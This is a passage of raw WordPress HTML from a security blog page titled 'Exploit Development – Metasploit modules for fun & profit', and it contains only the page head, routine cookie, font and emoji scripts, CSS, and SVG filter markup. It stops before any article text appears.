<!DOCTYPE html>
<html lang="en-US" class="html_stretched responsive av-preloader-disabled  html_header_top html_logo_left html_main_nav_header html_menu_right html_large html_header_sticky html_header_shrinking html_mobile_menu_phone html_header_searchicon html_content_align_center html_header_unstick_top html_header_stretch_disabled html_elegant-blog html_av-overlay-side html_av-overlay-side-minimal html_av-submenu-noclone html_entry_id_313 av-cookies-consent-show-message-bar av-cookies-cookie-consent-enabled av-cookies-can-opt-out av-cookies-user-silent-accept avia-cookie-check-browser-settings av-no-preview av-default-lightbox html_text_menu_active av-mobile-menu-switch-default">
<head>
<meta charset="UTF-8">
<meta name="robots" content="index, follow">


<!-- mobile setting -->
<meta name="viewport" content="width=device-width, initial-scale=1">

<!-- Scripts/CSS and wp_head hook -->
<title>Exploit Development &#8211; Metasploit modules for fun &amp; profit &#8211; Team ROT Information Security</title>
<meta name="robots" content="max-image-preview:large">

				<script type="text/javascript">

				function avia_cookie_check_sessionStorage()
				{
					//	FF throws error when all cookies blocked !!
					var sessionBlocked = false;
					try
					{
						var test = sessionStorage.getItem( 'aviaCookieRefused' ) != null;
					}
					catch(e)
					{
						sessionBlocked = true;
					}

					var aviaCookieRefused = ! sessionBlocked ? sessionStorage.getItem( 'aviaCookieRefused' ) : null;

					var html = document.getElementsByTagName('html')[0];

					/**
					 * Set a class to avoid calls to sessionStorage
					 */
					if( sessionBlocked || aviaCookieRefused )
					{
						if( html.className.indexOf('av-cookies-session-refused') < 0 )
						{
							html.className += ' av-cookies-session-refused';
						}
					}

					if( sessionBlocked || aviaCookieRefused || document.cookie.match(/aviaCookieConsent/) )
					{
						if( html.className.indexOf('av-cookies-user-silent-accept') >= 0 )
						{
							 html.className = html.className.replace(/\bav-cookies-user-silent-accept\b/g, '');
						}
					}
				}

				avia_cookie_check_sessionStorage();

			</script>
			<link rel="alternate" type="application/rss+xml" title="Team ROT Information Security &raquo; Feed" href="/feed/">
<link rel="alternate" type="application/rss+xml" title="Team ROT Information Security &raquo; Comments Feed" href="/comments/feed/">
<link rel="alternate" type="application/rss+xml" title="Team ROT Information Security &raquo; Exploit Development &#8211; Metasploit modules for fun &amp; profit Comments Feed" href="/how-to-metasploit-exploit-development/feed/">

<!-- google webfont font replacement -->

			<script type="text/javascript">(function() {

					/*	check if webfonts are disabled by user setting via cookie - or user must opt in.	*/
					var html = document.getElementsByTagName('html')[0];
					var cookie_check = html.className.indexOf('av-cookies-needs-opt-in') >= 0 || html.className.indexOf('av-cookies-can-opt-out') >= 0;
					var allow_continue = true;
					var silent_accept_cookie = html.className.indexOf('av-cookies-user-silent-accept') >= 0;

					if( cookie_check && ! silent_accept_cookie )
					{
						if( ! document.cookie.match(/aviaCookieConsent/) || html.className.indexOf('av-cookies-session-refused') >= 0 )
						{
							allow_continue = false;
						}
						else
						{
							if( ! document.cookie.match(/aviaPrivacyRefuseCookiesHideBar/) )
							{
								allow_continue = false;
							}
							else if( ! document.cookie.match(/aviaPrivacyEssentialCookiesEnabled/) )
							{
								allow_continue = false;
							}
							else if( document.cookie.match(/aviaPrivacyGoogleWebfontsDisabled/) )
							{
								allow_continue = false;
							}
						}
					}

					if( allow_continue )
					{
						var f = document.createElement('link');

						f.type 	= 'text/css';
						f.rel 	= 'stylesheet';
						f.href 	= 'https://fonts.googleapis.com/css?family=Lato:300,400,700&display=auto';
						f.id 	= 'avia-google-webfont';

						document.getElementsByTagName('head')[0].appendChild(f);
					}
				})();</script>
			<script type="text/javascript">
window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/14.0.0\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/14.0.0\/svg\/","svgExt":".svg","source":{"concatemoji":"\/wp-includes\/js\/wp-emoji-release.min.js?ver=6.2"}};
/*! This file is auto-generated */
!function(e,a,t){var n,r,o,i=a.createElement("canvas"),p=i.getContext&&i.getContext("2d");function s(e,t){p.clearRect(0,0,i.width,i.height),p.fillText(e,0,0);e=i.toDataURL();return p.clearRect(0,0,i.width,i.height),p.fillText(t,0,0),e===i.toDataURL()}function c(e){var t=a.createElement("script");t.src=e,t.defer=t.type="text/javascript",a.getElementsByTagName("head")[0].appendChild(t)}for(o=Array("flag","emoji"),t.supports={everything:!0,everythingExceptFlag:!0},r=0;r<o.length;r++)t.supports[o[r]]=function(e){if(p&&p.fillText)switch(p.textBaseline="top",p.font="600 32px Arial",e){case"flag":return s("🏳️‍⚧️","🏳️​⚧️")?!1:!s("🇺🇳","🇺​🇳")&&!s("🏴󠁧󠁢󠁥󠁮󠁧󠁿","🏴​󠁧​󠁢​󠁥​󠁮​󠁧​󠁿");case"emoji":return!s("🫱🏻‍🫲🏿","🫱🏻​🫲🏿")}return!1}(o[r]),t.supports.everything=t.supports.everything&&t.supports[o[r]],"flag"!==o[r]&&(t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&t.supports[o[r]]);t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&!t.supports.flag,t.DOMReady=!1,t.readyCallback=function(){t.DOMReady=!0},t.supports.everything||(n=function(){t.readyCallback()},a.addEventListener?(a.addEventListener("DOMContentLoaded",n,!1),e.addEventListener("load",n,!1)):(e.attachEvent("onload",n),a.attachEvent("onreadystatechange",function(){"complete"===a.readyState&&t.readyCallback()})),(e=t.source||{}).concatemoji?c(e.concatemoji):e.wpemoji&&e.twemoji&&(c(e.twemoji),c(e.wpemoji)))}(window,document,window._wpemojiSettings);
</script>
<style type="text/css">img.wp-smiley,
img.emoji {
	display: inline !important;
	border: none !important;
	box-shadow: none !important;
	height: 1em !important;
	width: 1em !important;
	margin: 0 0.07em !important;
	vertical-align: -0.1em !important;
	background: none !important;
	padding: 0 !important;
}</style>
	<link rel="stylesheet" id="wp-block-library-css" href="/wp-includes/css/dist/block-library/style.min.css?ver=6.2" type="text/css" media="all">
<style id="global-styles-inline-css" type="text/css">body{--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--color--metallic-red: #b02b2c;--wp--preset--color--maximum-yellow-red: #edae44;--wp--preset--color--yellow-sun: #eeee22;--wp--preset--color--palm-leaf: #83a846;--wp--preset--color--aero: #7bb0e7;--wp--preset--color--old-lavender: #745f7e;--wp--preset--color--steel-teal: #5f8789;--wp--preset--color--raspberry-pink: #d65799;--wp--preset--color--medium-turquoise: #4ecac2;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--duotone--dark-grayscale: url('#wp-duotone-dark-grayscale');--wp--preset--duotone--grayscale: url('#wp-duotone-grayscale');--wp--preset--duotone--purple-yellow: url('#wp-duotone-purple-yellow');--wp--preset--duotone--blue-red: url('#wp-duotone-blue-red');--wp--preset--duotone--midnight: url('#wp-duotone-midnight');--wp--preset--duotone--magenta-yellow: url('#wp-duotone-magenta-yellow');--wp--preset--duotone--purple-green: url('#wp-duotone-purple-green');--wp--preset--duotone--blue-orange: url('#wp-duotone-blue-orange');--wp--preset--font-size--small: 1rem;--wp--preset--font-size--medium: 1.125rem;--wp--preset--font-size--large: 1.75rem;--wp--preset--font-size--x-large: clamp(1.75rem, 3vw, 2.25rem);--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}body { margin: 0;--wp--style--global--content-size: 800px;--wp--style--global--wide-size: 1130px; }.wp-site-blocks > .alignleft { float: left; margin-right: 2em; }.wp-site-blocks > .alignright { float: right; margin-left: 2em; }.wp-site-blocks > .aligncenter { justify-content: center; margin-left: auto; margin-right: auto; }:where(.is-layout-flex){gap: 0.5em;}body .is-layout-flow > .alignleft{float: left;margin-inline-start: 0;margin-inline-end: 2em;}body .is-layout-flow > .alignright{float: right;margin-inline-start: 2em;margin-inline-end: 0;}body .is-layout-flow > .aligncenter{margin-left: auto !important;margin-right: auto !important;}body .is-layout-constrained > .alignleft{float: left;margin-inline-start: 0;margin-inline-end: 2em;}body .is-layout-constrained > .alignright{float: right;margin-inline-start: 2em;margin-inline-end: 0;}body .is-layout-constrained > .aligncenter{margin-left: auto !important;margin-right: auto !important;}body .is-layout-constrained > :where(:not(.alignleft):not(.alignright):not(.alignfull)){max-width: var(--wp--style--global--content-size);margin-left: auto !important;margin-right: auto !important;}body .is-layout-constrained > .alignwide{max-width: var(--wp--style--global--wide-size);}body .is-layout-flex{display: flex;}body .is-layout-flex{flex-wrap: wrap;align-items: center;}body .is-layout-flex > *{margin: 0;}body{padding-top: 0px;padding-right: 0px;padding-bottom: 0px;padding-left: 0px;}a:where(:not(.wp-element-button)){text-decoration: underline;}.wp-element-button, .wp-block-button__link{background-color: #32373c;border-width: 0;color: #fff;font-family: inherit;font-size: inherit;line-height: inherit;padding: calc(0.667em + 2px) calc(1.333em + 2px);text-decoration: none;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-metallic-red-color{color: var(--wp--preset--color--metallic-red) !important;}.has-maximum-yellow-red-color{color: var(--wp--preset--color--maximum-yellow-red) !important;}.has-yellow-sun-color{color: var(--wp--preset--color--yellow-sun) !important;}.has-palm-leaf-color{color: var(--wp--preset--color--palm-leaf) !important;}.has-aero-color{color: var(--wp--preset--color--aero) !important;}.has-old-lavender-color{color: var(--wp--preset--color--old-lavender) !important;}.has-steel-teal-color{color: var(--wp--preset--color--steel-teal) !important;}.has-raspberry-pink-color{color: var(--wp--preset--color--raspberry-pink) !important;}.has-medium-turquoise-color{color: var(--wp--preset--color--medium-turquoise) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-metallic-red-background-color{background-color: var(--wp--preset--color--metallic-red) !important;}.has-maximum-yellow-red-background-color{background-color: var(--wp--preset--color--maximum-yellow-red) !important;}.has-yellow-sun-background-color{background-color: var(--wp--preset--color--yellow-sun) !important;}.has-palm-leaf-background-color{background-color: var(--wp--preset--color--palm-leaf) !important;}.has-aero-background-color{background-color: var(--wp--preset--color--aero) !important;}.has-old-lavender-background-color{background-color: var(--wp--preset--color--old-lavender) !important;}.has-steel-teal-background-color{background-color: var(--wp--preset--color--steel-teal) !important;}.has-raspberry-pink-background-color{background-color: var(--wp--preset--color--raspberry-pink) !important;}.has-medium-turquoise-background-color{background-color: var(--wp--preset--color--medium-turquoise) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-metallic-red-border-color{border-color: var(--wp--preset--color--metallic-red) !important;}.has-maximum-yellow-red-border-color{border-color: var(--wp--preset--color--maximum-yellow-red) !important;}.has-yellow-sun-border-color{border-color: var(--wp--preset--color--yellow-sun) !important;}.has-palm-leaf-border-color{border-color: var(--wp--preset--color--palm-leaf) !important;}.has-aero-border-color{border-color: var(--wp--preset--color--aero) !important;}.has-old-lavender-border-color{border-color: var(--wp--preset--color--old-lavender) !important;}.has-steel-teal-border-color{border-color: var(--wp--preset--color--steel-teal) !important;}.has-raspberry-pink-border-color{border-color: var(--wp--preset--color--raspberry-pink) !important;}.has-medium-turquoise-border-color{border-color: var(--wp--preset--color--medium-turquoise) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
.wp-block-navigation a:where(:not(.wp-element-button)){color: inherit;}
:where(.wp-block-columns.is-layout-flex){gap: 2em;}
.wp-block-pullquote{font-size: 1.5em;line-height: 1.6;}</style>
<link rel="stylesheet" id="avia-merged-styles-css" href="/wp-content/uploads/dynamic_avia/avia-merged-styles-781f3117e4a904b30ef394ce8634ac35---6433e3f47b989.css" type="text/css" media="all">
<script type="text/javascript" src="/wp-includes/js/jquery/jquery.min.js?ver=3.6.3" id="jquery-core-js"></script>
<script type="text/javascript" src="/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.4.0" id="jquery-migrate-js"></script>
<link rel="https://api.w.org/" href="/wp-json/">
<link rel="alternate" type="application/json" href="/wp-json/wp/v2/posts/313">
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="/xmlrpc.php?rsd">
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="/wp-includes/wlwmanifest.xml">
<meta name="generator" content="WordPress 6.2">
<link rel="canonical" href="/how-to-metasploit-exploit-development/">
<link rel="shortlink" href="/?p=313">
<link rel="alternate" type="application/json+oembed" href="/wp-json/oembed/1.0/embed?url=https%3A%2F%2F%2Fhow-to-metasploit-exploit-development%2F">
<link rel="alternate" type="text/xml+oembed" href="/wp-json/oembed/1.0/embed?url=https%3A%2F%2F%2Fhow-to-metasploit-exploit-development%2F#038;format=xml">
<link rel="profile" href="http://gmpg.org/xfn/11">
<link rel="alternate" type="application/rss+xml" title="Team ROT Information Security RSS2 Feed" href="/feed/">
<link rel="pingback" href="/xmlrpc.php">
<!--[if lt IE 9]><script src="https://teamrot.fi/wp-content/themes/enfold/js/html5shiv.js"></script><![endif]-->
<link rel="icon" href="/wp-content/uploads/2017/10/redlogo-300x300.png" type="image/png">

<!-- To speed up the rendering and to display the site as fast as possible to the user we include some styles and scripts for above the fold content inline -->
<script type="text/javascript">'use strict';var avia_is_mobile=!1;if(/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)&&'ontouchstart' in document.documentElement){avia_is_mobile=!0;document.documentElement.className+=' avia_mobile '}
else{document.documentElement.className+=' avia_desktop '};document.documentElement.className+=' js_active ';(function(){var e=['-webkit-','-moz-','-ms-',''],n='',o=!1,a=!1;for(var t in e){if(e[t]+'transform' in document.documentElement.style){o=!0;n=e[t]+'transform'};if(e[t]+'perspective' in document.documentElement.style){a=!0}};if(o){document.documentElement.className+=' avia_transform '};if(a){document.documentElement.className+=' avia_transform3d '};if(typeof document.getElementsByClassName=='function'&&typeof document.documentElement.getBoundingClientRect=='function'&&avia_is_mobile==!1){if(n&&window.innerHeight>0){setTimeout(function(){var e=0,o={},a=0,t=document.getElementsByClassName('av-parallax'),i=window.pageYOffset||document.documentElement.scrollTop;for(e=0;e<t.length;e++){t[e].style.top='0px';o=t[e].getBoundingClientRect();a=Math.ceil((window.innerHeight+i-o.top)*0.3);t[e].style[n]='translate(0px, '+a+'px)';t[e].style.top='auto';t[e].className+=' enabled-parallax '}},50)}}})();</script><link rel="icon" href="/wp-content/uploads/2020/08/cropped-ROT2-WHITE-BG.eps_-2-32x32.png" sizes="32x32">
<link rel="icon" href="/wp-content/uploads/2020/08/cropped-ROT2-WHITE-BG.eps_-2-192x192.png" sizes="192x192">
<link rel="apple-touch-icon" href="/wp-content/uploads/2020/08/cropped-ROT2-WHITE-BG.eps_-2-180x180.png">
<meta name="msapplication-TileImage" content="/wp-content/uploads/2020/08/cropped-ROT2-WHITE-BG.eps_-2-270x270.png">
		<style type="text/css" id="wp-custom-css">pre {
	background: #5555550a !important;
	font-family: Consolas, "Andale Mono WT", "Andale Mono", "Lucida Console", 
"Lucida Sans Typewriter", "DejaVu Sans Mono", "Bitstream Vera Sans Mono", 
"Liberation Mono", "Nimbus Mono L", Monaco, "Courier New", Courier, monospace;
	line-height: 1.3;
}

/* Disable animation sitewide */
*:not(.av-image-hotspot-pulse){
opacity: 100!important;
 /*CSS transitions*/
 -o-transition-property: none !important;
 -moz-transition-property: none !important;
 -ms-transition-property: none !important;
 -webkit-transition-property: none !important;
 transition-property: none !important;
 /*CSS transforms*/
 -o-transform: none !important;
 -moz-transform: none !important;
 -ms-transform: none !important;
 -webkit-transform: none !important;
 transform: none !important;
 /*CSS animations*/
 -webkit-animation: none !important;
 -moz-animation: none !important;
 -o-animation: none !important;
 -ms-animation: none !important;
 animation: none !important;
}

img {
	    opacity: 100 !important;
}</style>
		<style type="text/css">@font-face {font-family: 'entypo-fontello'; font-weight: normal; font-style: normal; font-display: auto;
		src: url('/wp-content/themes/enfold/config-templatebuilder/avia-template-builder/assets/fonts/entypo-fontello.woff2') format('woff2'),
		url('/wp-content/themes/enfold/config-templatebuilder/avia-template-builder/assets/fonts/entypo-fontello.woff') format('woff'),
		url('/wp-content/themes/enfold/config-templatebuilder/avia-template-builder/assets/fonts/entypo-fontello.ttf') format('truetype'),
		url('/wp-content/themes/enfold/config-templatebuilder/avia-template-builder/assets/fonts/entypo-fontello.svg#entypo-fontello') format('svg'),
		url('/wp-content/themes/enfold/config-templatebuilder/avia-template-builder/assets/fonts/entypo-fontello.eot'),
		url('/wp-content/themes/enfold/config-templatebuilder/avia-template-builder/assets/fonts/entypo-fontello.eot#iefix') format('embedded-opentype');
		} #top .avia-font-entypo-fontello, body .avia-font-entypo-fontello, html body [data-av_iconfont='entypo-fontello']:before{ font-family: 'entypo-fontello'; }</style>

<!--
Debugging Info for Theme support: 

Theme: Enfold
Version: 5.5
Installed: enfold
AviaFramework Version: 5.3
AviaBuilder Version: 5.3
aviaElementManager Version: 1.0.1
ML:1280-PU:24-PLA:2
WP:6.2
Compress: CSS:all theme files - JS:all theme files
Updates: enabled - token has changed and not verified
PLAu:2
-->
</head>

<body id="top" class="post-template-default single single-post postid-313 single-format-standard stretched no_sidebar_border rtl_columns av-curtain-numeric lato  avia-responsive-images-support av-recaptcha-enabled av-google-badge-hide" itemscope="itemscope" itemtype="https://schema.org/WebPage">

	<svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;"><defs><filter id="wp-duotone-dark-grayscale"><fecolormatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 "></fecolormatrix><fecomponenttransfer color-interpolation-filters="sRGB"><fefuncr type="table" tablevalues="0 0.49803921568627"></fefuncr><fefuncg type="table" tablevalues="0 0.49803921568627"></fefuncg><fefuncb type="table" tablevalues="0 0.49803921568627"></fefuncb><fefunca type="table" tablevalues="1 1"></fefunca></fecomponenttransfer><fecomposite in2="SourceGraphic" operator="in"></fecomposite></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;"><defs><filter id="wp-duotone-grayscale"><fecolormatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 "></fecolormatrix><fecomponenttransfer color-interpolation-filters="sRGB"><fefuncr type="table" tablevalues="0 1"></fefuncr><fefuncg type="table" tablevalues="0 1"></fefuncg><fefuncb type="table" tablevalues="0 1"></fefuncb><fefunca type="table" tablevalues="1 1"></fefunca></fecomponenttransfer><fecomposite in2="SourceGraphic" operator="in"></fecomposite></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;"><defs><filter id="wp-duotone-purple-yellow"><fecolormatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 "></fecolormatrix><fecomponenttransfer color-interpolation-filters="sRGB"><fefuncr type="table" tablevalues="0.54901960784314 0.98823529411765"></fefuncr><fefuncg type="table" tablevalues="0 1"></fefuncg><fefuncb type="table" tablevalues="0.71764705882353 0.25490196078431"></fefuncb><fefunca type="table" tablevalues="1 1"></fefunca></fecomponenttransfer><fecomposite in2="SourceGraphic" operator="in"></fecomposite></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;"><defs><filter id="wp-duotone-blue-red"><fecolormatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 "></fecolormatrix><fecomponenttransfer color-interpolation-filters="sRGB"><fefuncr type="table" tablevalues="0 1"></fefuncr><fefuncg type="table" tablevalues="0 0.27843137254902"></fefuncg><fefuncb type="table" tablevalues="0.5921568627451 0.27843137254902"></fefuncb><fefunca type="table" tablevalues="1 1"></fefunca></fecomponenttransfer><fecomposite in2="SourceGraphic" operator="in"></fecomposite></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;"><defs><filter id="wp-duotone-midnight"><fecolormatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 "></fecolormatrix><fecomponenttransfer color-interpolation-filters="sRGB"><fefuncr type="table" tablevalues="0 0"></fefuncr><fefuncg type="table" tablevalues="0 0.64705882352941"></fefuncg><fefuncb type="table" tablevalues="0 1"></fefuncb><fefunca type="table" tablevalues="1 1"></fefunca></fecomponenttransfer><fecomposite in2="SourceGraphic" operator="in"></fecomposite></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;"><defs><filter id="wp-duotone-magenta-yellow"><fecolormatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 "></fecolormatrix><fecomponenttransfer color-interpolation-filters="sRGB"><fefuncr type="table" tablevalues="0.78039215686275 1"></fefuncr><fefuncg type="table" tablevalues="0 0.94901960784314"></fefuncg><fefuncb type="table" tablevalues="0.35294117647059 0.47058823529412"></fefuncb><fefunca type="table" tablevalues="1 1"></fefunca></fecomponenttransfer><fecomposite in2="SourceGraphic" operator="in"></fecomposite></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;"><defs><filter id="wp-duotone-purple-green"><fecolormatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 "></fecolormatrix><fecomponenttransfer color-interpolation-filters="sRGB"><fefuncr type="table" tablevalues="0.65098039215686 0.40392156862745"></fefuncr><fefuncg type="table" tablevalues="0 1"></fefuncg><fefuncb type="table" tablevalues="0.44705882352941 0.4"></fefuncb><fefunca type="table" tablevalues="1 1"></fefunca></fecomponenttransfer><fecomposite in2="SourceGraphic" operator="in"></fecomposite></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;"><defs><filter id="wp-duotone-blue-orange"><fecolormatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 